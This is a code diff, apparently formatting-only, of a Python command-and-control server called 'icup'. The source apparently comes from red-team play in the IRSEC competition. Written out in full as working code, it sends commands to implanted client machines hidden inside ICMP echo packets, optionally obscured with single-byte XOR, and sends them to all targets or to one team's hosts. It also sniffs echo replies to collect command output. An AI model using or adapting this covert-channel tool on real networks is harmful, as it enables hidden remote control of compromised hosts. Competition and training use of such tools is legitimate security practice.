@@ -3,29 +3,31 @@
 # ICMP C2, think about it
 # Storing client as /etc/icmpd service
 
-from scapy.all import * 
-from scapy.all import ICMP,IP
+from scapy.all import *
+from scapy.all import ICMP, IP
 import json
 import threading
 
 # STILL IN PRODUCTION PLEASE DONT JUDGE I DIDNT HAVE A LOT OF TIME
 
-DEBUG = True                   # Set to display statements after command execution
-DEVDEBUG = False               # Set to display statements specific to debugging issues
-JSONFILE = "targets.json"      # Set to point to configuration files with loadclients
-SuperSecretMode = False        # Enables "encryption"
-KEY = "B"                      # Key for "encryption"
+DEBUG = True  # Set to display statements after command execution
+DEVDEBUG = False  # Set to display statements specific to debugging issues
+JSONFILE = "targets.json"  # Set to point to configuration files with loadclients
+SuperSecretMode = False  # Enables "encryption"
+KEY = "B"  # Key for "encryption"
 # CLOUD = "172"                # No valid cloud targets in IRSEC
-LAN = "10"                     # Helps specify what octet to look for team X octet
-ALIVE = dict()                 # All responding clients
+LAN = "10"  # Helps specify what octet to look for team X octet
+ALIVE = dict()  # All responding clients
 
-def print_title(): 
-    print(".__                          ___             .__.__    ___") 
-    print("|__| ____  __ ________      /  /   _______  _|__|  |   \  \\") 
-    print("|  _/ ___\|  |  \____ \    /  /  _/ __ \  \/ |  |  |    \  \\")  
-    print("|  \  \___|  |  |  |_> >  (  (   \  ___/\   /|  |  |__   )  )") 
-    print("|__|\___  |____/|   __/    \  \   \___  >\_/ |__|____/  /  /")  
-    print("        \/      |__|        \__\      \/               /__/") 
+
+def print_title():
+    print(".__                          ___             .__.__    ___")
+    print("|__| ____  __ ________      /  /   _______  _|__|  |   \  \\")
+    print("|  _/ ___\|  |  \____ \    /  /  _/ __ \  \/ |  |  |    \  \\")
+    print("|  \  \___|  |  |  |_> >  (  (   \  ___/\   /|  |  |__   )  )")
+    print("|__|\___  |____/|   __/    \  \   \___  >\_/ |__|____/  /  /")
+    print("        \/      |__|        \__\      \/               /__/")
+
 
 def print_help():
     print("\taddclient <IP_ADDRESS>       Adds new client by IP")
@@ -42,71 +44,90 @@ def print_help():
     print("\tcheckalive                   Generates a board of replying clients")
     # print("\tshell <ID>                   Creates a direct line with client at ID")  [FIX]
     print("\tkill                         Stops server")
-    print("\tssm                          Enables Super Secret Mode")                    
+    print("\tssm                          Enables Super Secret Mode")
     print("\thelp                         Prints this")
+
 
 # Add clients to the dictionary of clients, the IP from arguments, and the id
 def addclient(clients, arguments, id):
-    clients[id] = arguments[1] 
-    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}") 
+    clients[id] = arguments[1]
+    if DEBUG:
+        print(f"[DEBUG] Client {id} added at {clients.get(id)}")
     id += 1
     return id
+
 
 # Add clients with the JSON configuration
 def json_add_client(ip, clients, id):
     clients[id] = ip
-    if DEBUG: print(f"[DEBUG] Client {id} added at {clients.get(id)}")
+    if DEBUG:
+        print(f"[DEBUG] Client {id} added at {clients.get(id)}")
     id += 1
     return id
 
-# Show all clients within the client dictionary 
+
+# Show all clients within the client dictionary
 def showclients(clients):
     for client in clients:
         print(f"Client {client} at {clients.get(client)}")
 
+
 # Remove the client by client ID
 def removeclient(arguments, clients):
-    if len(arguments)<2: 
+    if len(arguments) < 2:
         print("[ERROR] Specify client by ID")
     else:
-        if DEBUG: print(f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}") 
+        if DEBUG:
+            print(
+                f"[DEBUG] Client {arguments[1]} removed from {clients.get(int(arguments[1]))}"
+            )
         clients.pop(int(arguments[1]))
+
 
 # Remove all clients within the client dictionary
 def removeallclients(clients):
     clients.clear()
-    if DEBUG: print(f"[DEBUG] All clients removed")
+    if DEBUG:
+        print(f"[DEBUG] All clients removed")
+
 
 # Send command to client by ID via ICMP data, max of 1472 data bytes
 def send_command(arguments, clients, execute):
     global SuperSecretMode
     try:
-        clientcommand = arguments[1] 
+        clientcommand = arguments[1]
         clienttokens = clientcommand.split(" ", 1)
         if clients.get(int(clienttokens[0])) != None:
-            if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))
+            if DEVDEBUG:
+                print(len(clienttokens[1].encode("utf-8")))
 
             # TODO FOR PACKET SEGMENTATION
             # if len(clienttokens[1].encode('utf-8')) > 1469:
             #     piece = clienttokens[1][:1469]
-            #     segment = "!!!" + piece 
+            #     segment = "!!!" + piece
             #  segments = len(clienttokens[1].encode('utf-8'))//1469
             # if DEVDEBUG: print(segments)
 
             send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1], execute)
-            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
-            if DEBUG and not SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
+            if DEBUG and SuperSecretMode:
+                print(
+                    f'[DEBUG] "{clienttokens[1]}" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)'
+                )
+            if DEBUG and not SuperSecretMode:
+                print(
+                    f'[DEBUG] "{clienttokens[1]}" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}'
+                )
         else:
             print(f"[ERROR] No client at ID {clienttokens[0]}")
     except:
         print("[ERROR] Usage: send <ID> <message>")
-
 # "Encryption" for SuperSecretMode
 def encrypt_decrypt(plaintext):
     encrypted = ""
     for i in range(len(plaintext)):
-        encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
+        encrypted += chr(ord(plaintext[i]) ^ ord(KEY))
     return encrypted
+
 
 # Send the command and add header
 def send_over_icmp(clientip, command, execute):
@@ -117,58 +138,80 @@ def send_over_icmp(clientip, command, execute):
         if SuperSecretMode:
             clientcommand = "!!!$1" + encrypted
         else:
-            clientcommand = "!!!01" + command         
+            clientcommand = "!!!01" + command
     else:
         if SuperSecretMode:
             clientcommand = "!!!$0" + encrypted
         else:
             clientcommand = "!!!00" + command
-    
-    evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
+
+    evil = IP(dst=clientip) / ICMP(type=8) / (clientcommand)
     send(evil, verbose=False)
+
 
 # Send command to all clients
 def sendtoall(arguments, clients, execute):
     global SuperSecretMode
-    if len(arguments)<2 or arguments[1] == "": 
+    if len(arguments) < 2 or arguments[1] == "":
         print("[ERROR] Usage: sendtoall <message>")
     else:
         for client in clients:
             send_over_icmp(clients.get(client), arguments[1], execute)
-            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
-            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+            if DEBUG and SuperSecretMode:
+                print(
+                    f'[DEBUG] "{arguments[1]}" sent to {client} at {clients.get(client)} (Super Secretly)'
+                )
+            elif DEBUG:
+                print(
+                    f'[DEBUG] "{arguments[1]}" sent to {client} at {clients.get(client)}'
+                )
+
 
 # Is this redundant? Yes. Am I fixing it? No.
 def exeonall(arguments, clients, execute):
     global SuperSecretMode
-    if len(arguments)<3 or arguments[1] == "": 
+    if len(arguments) < 3 or arguments[1] == "":
         print("[ERROR] Usage: exeonall <message>")
     else:
         for client in clients:
             send_over_icmp(clients.get(client), arguments[1], execute)
-            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
-            elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+            if DEBUG and SuperSecretMode:
+                print(
+                    f'[DEBUG] "{arguments[1]}" sent to {client} at {clients.get(client)} (Super Secretly)'
+                )
+            elif DEBUG:
+                print(
+                    f'[DEBUG] "{arguments[1]}" sent to {client} at {clients.get(client)}'
+                )
+
 
 # Execute on a specific team
 def exeonteam(arguments, clients, execute):
     global SuperSecretMode
-    if len(arguments)<2: 
+    if len(arguments) < 2:
         print("[ERROR] Usage: exeonteam <team> <message>")
     else:
         for client in clients:
-            octets = clients.get(client).split('.')
+            octets = clients.get(client).split(".")
             if octets[0] == LAN:
                 if str(arguments[1][0]) == str(octets[1]):
                     send_over_icmp(clients.get(client), arguments[1], execute)
-                    if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1][2:]}\" sent to {client} at {clients.get(client)} on team {octets[1]} (Super Secretly)")
-                    elif DEBUG: print(f"[DEBUG] \"{arguments[1][2:]}\" sent to client {client} at {clients.get(client)} on team {octets[1]}")
+                    if DEBUG and SuperSecretMode:
+                        print(
+                            f'[DEBUG] "{arguments[1][2:]}" sent to {client} at {clients.get(client)} on team {octets[1]} (Super Secretly)'
+                        )
+                    elif DEBUG:
+                        print(
+                            f'[DEBUG] "{arguments[1][2:]}" sent to client {client} at {clients.get(client)} on team {octets[1]}'
+                        )
 
             # [REMOVED CLOUD MODE FOR IRSEC]
-            # if octets[0] == CLOUD:                                    
+            # if octets[0] == CLOUD:
             #     if str(arguments[1][0]) == str(octets[2]):
             #         send_over_icmp(clients.get(client), arguments[1], execute)
             #         if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             #         elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+
 
 # TODO Repair or remove
 # # Place icupS into single client mode
@@ -183,7 +226,7 @@ def exeonteam(arguments, clients, execute):
 
 # Checks if an IP is valid
 def valid_IP(arguments):
-    a = arguments[1].split('.')
+    a = arguments[1].split(".")
     if len(a) != 4:
         return False
     for x in a:
@@ -194,9 +237,10 @@ def valid_IP(arguments):
             return False
     return True
 
+
 # Create clients based on JSON file
 def generate_targets(JSONFILE, clients, id):
-    f = open(JSONFILE, 'r')
+    f = open(JSONFILE, "r")
     data = json.loads(f.read())
     for jsonip in data:
         ip = data[jsonip]
@@ -204,11 +248,12 @@ def generate_targets(JSONFILE, clients, id):
     f.close()
     return id
 
+
 # Listen for responses and parse the header
 def listen(pkt):
-    src = pkt[IP].dst 
+    src = pkt[IP].dst
     payload = str(pkt.payload)
-    parsed = re.split('#{3}', payload)
+    parsed = re.split("#{3}", payload)
     if len(parsed) == 1:
         return
     else:
@@ -216,15 +261,16 @@ def listen(pkt):
         if command[0] == "$":
             # Decrypt and make output prettier
             output = encrypt_decrypt(command[1:])
-            newlineparsed = output.replace("\\\\n","\n")
-            newlineparsed = newlineparsed.replace("s\'n","\n")
-            newlineparsed = newlineparsed.replace(":s&","\n")
+            newlineparsed = output.replace("\\\\n", "\n")
+            newlineparsed = newlineparsed.replace("s'n", "\n")
+            newlineparsed = newlineparsed.replace(":s&", "\n")
             print(f"Recieved from {src}:\n\t{newlineparsed}")
             check_alive(src, output)
-        else: 
-            newlineparsed = command[2:].replace("\\\\n","\n")
+        else:
+            newlineparsed = command[2:].replace("\\\\n", "\n")
             print(f"Recieved from {src}:\n\t{command[0:2]} {newlineparsed}")
             check_alive(src, command)
+
 
 # Parses client for ALIVE board response
 def check_alive(src, command):
@@ -234,47 +280,57 @@ def check_alive(src, command):
     else:
         ALIVE[src] = False
 
+
 # Print ALIVE status per client
 def show_alive(clients):
     global ALIVE
     for value in ALIVE:
         if ALIVE[value] == True:
-            print(f"\033[92m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m", end=" ")
-        elif ALIVE[value] == False: 
-            print(f"\033[91m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m", end=" ")
+            print(
+                f"\033[92m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
+                end=" ",
+            )
+        elif ALIVE[value] == False:
+            print(
+                f"\033[91m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m",
+                end=" ",
+            )
     print()
+
 
 # Starts the sniffing thread
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
 
+
 # Enables SuperSecretMode for traffic encryption
 def change_ssm():
     global SuperSecretMode
-    if SuperSecretMode: 
+    if SuperSecretMode:
         SuperSecretMode = False
         print("SSM Disabled")
-    else: 
+    else:
         SuperSecretMode = True
         print("SSM Enabled")
+
 
 def main():
     global ALIVE
     print_title()
-    print("Enter command to begin, or \"help\" for help:")
+    print('Enter command to begin, or "help" for help:')
     threading.Thread(target=sniffer, daemon=True).start()
     clients = dict()
     id = 0
-    while(True):
+    while True:
         command = input(">> ")
         arguments = command.split(" ", 1)
         if arguments[0] == "":
             continue
         elif arguments[0] == "addclient":
-            if len(arguments)<2: 
+            if len(arguments) < 2:
                 print("[ERROR] Missing client IP field")
                 continue
-            if valid_IP(arguments): 
+            if valid_IP(arguments):
                 id = addclient(clients, arguments, id)
             else:
                 print("[ERROR] Invalid IP Address")
@@ -297,7 +353,8 @@ def main():
         elif arguments[0] == "exeonteam":
             exeonteam(arguments, clients, execute=True)
         elif arguments[0] == "checkalive":
-            for client in clients: ALIVE[clients.get(client)] = False
+            for client in clients:
+                ALIVE[clients.get(client)] = False
             arguments = ["checkalive", "alive"]
             sendtoall(arguments, clients, execute=False)
             time.sleep(7)
@@ -314,7 +371,7 @@ def main():
         elif arguments[0] == "help":
             print_help()
         else:
-            print("Invalid option, use \"help\" for available commands")
+            print('Invalid option, use "help" for available commands')
 
 
 if __name__ == "__main__":
